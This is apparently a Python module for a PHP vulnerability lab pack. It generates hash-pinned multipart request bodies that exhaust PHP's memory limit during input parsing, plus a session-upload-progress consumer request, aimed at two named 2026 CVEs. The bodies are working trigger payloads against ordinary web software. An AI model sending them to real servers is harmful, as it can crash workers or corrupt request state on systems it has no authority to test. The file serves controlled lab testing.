"""Pinned request payloads for the PHP2Shell 2026 managed lab packs.

These are the request bodies for CVE-2026-109618 and CVE-2026-109619
(GHSA-w8hw-w9fx-j79w and GHSA-6wmf-4rv5-p3rp): out-of-memory during request
input parsing leaves partly-initialized or worker-global state inconsistent,
which the request shutdown or the next request on the same worker then
consumes. Both bodies are multipart forms whose oversized part headers
exhaust the configured memory limit mid-parse - the advisory's documented
trigger class. The lab's reviewed configuration sets memory_limit below
post_max_size so the exhaustion is reachable without the advisory's
missing-content-length bypass (that bypass exists to defeat the default
limit ordering; the lab inverts the ordering instead - same bug, reviewed
configuration, documented in the pack).

The bodies are generated, not shipped as opaque bytes, and each build
asserts a pinned SHA256, so a pack run can never carry different input than
what was reviewed. No exploit code is included: the bodies are inert multipart
padding whose only payload is memory pressure.
"""

import hashlib

# Integrity pins asserted on every build: a run can never carry different
# input than what was reviewed.
OOM_BODY_SHA256 = "058e648c1dff45a42c1a7231aad412b98f685e89c809ec9e6fe686fd6bdcd2af"
OOM_BODY_WITH_PROGRESS_SHA256 = "f3e1c679297bf7bc8c8df378ac95dc25657dd5c2d22506c0723000f785844b28"
CONSUMER_BODY_SHA256 = "b76da585a6490b758ffa370ea5dbc9174e0fc02fdca948136a9a928784767d11"

_BOUNDARY = b"mockforge2026lab"
BOUNDARY = "mockforge2026lab"
# ~100 parts x ~200 KB of part-header padding crosses the reviewed 16M
# memory_limit while staying under the pack's 48 MiB forwarding bound; part
# filenames also push past the configured max_file_uploads, the advisory's
# third exhaustion route.
_PARTS = 100
_PADDING_PER_PART = 200_000
_UPLOAD_PROGRESS_FIELD = b"PHP_SESSION_UPLOAD_PROGRESS"


def _part(index: int, padding: bytes, with_progress: bool = False) -> bytes:
    disposition = (
        f'Content-Disposition: form-data; name="labfield{index}"; '
        f'filename="labfile{index}.bin"\r\n'
    ).encode()
    part = b"--" + _BOUNDARY + b"\r\n" + disposition
    if with_progress and index == 0:
        part += (
            f"Content-Disposition: form-data; name=\"{_UPLOAD_PROGRESS_FIELD.decode()}\"\r\n\r\n"
        ).encode()
        part += b"mockforge-progress-key\r\n"
        part += b"--" + _BOUNDARY + b"\r\n" + disposition
    part += f"X-Lab-Padding-{index}: ".encode() + padding + b"\r\n\r\n"
    return part


def _assemble(parts: list, closing: bytes) -> bytes:
    body = b"".join(parts) + closing
    return body


def oom_body() -> bytes:
    """Producer body: oversized multipart part headers force an OOM bail-out
    during input parsing (the advisory's trigger class for CVE-2026-109618,
    and the producer half of CVE-2026-109619)."""
    padding = b"A" * _PADDING_PER_PART
    parts = [_part(index, padding) for index in range(_PARTS)]
    body = _assemble(parts, b"--" + _BOUNDARY + b"--\r\n")
    if hashlib.sha256(body).hexdigest() != OOM_BODY_SHA256:
        raise RuntimeError("oom_body digest mismatch against the pinned review input")
    return body


def oom_body_with_progress() -> bytes:
    """Producer body for the same-worker pack: identical memory pressure,
    with a session-upload-progress field active so the parse writes
    session state before the OOM (the advisory's producer for the
    session-lifecycle consumer path)."""
    padding = b"A" * _PADDING_PER_PART
    parts = [_part(index, padding, with_progress=(index == 0)) for index in range(_PARTS)]
    body = _assemble(parts, b"--" + _BOUNDARY + b"--\r\n")
    if hashlib.sha256(body).hexdigest() != OOM_BODY_WITH_PROGRESS_SHA256:
        raise RuntimeError("oom_body_with_progress digest mismatch against the pinned review input")
    return body


def consumer_body(token: str = "mockforge-progress-key") -> bytes:
    """Consumer body: a small multipart upload-progress request whose
    pre-application consumer touches worker-global state (the advisory's
    consumer for CVE-2026-109619; session upload progress is enabled by
    default and needs no application code)."""
    part = (
        b"--"
        + _BOUNDARY
        + b"\r\n"
        + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + token.encode()
        + b"\r\n"
        + b"--"
        + _BOUNDARY
        + b"--\r\n"
    )
    if hashlib.sha256(part).hexdigest() != CONSUMER_BODY_SHA256:
        raise RuntimeError("consumer_body digest mismatch against the pinned review input")
    return part


def digest_of(body: bytes) -> str:
    return hashlib.sha256(body).hexdigest()
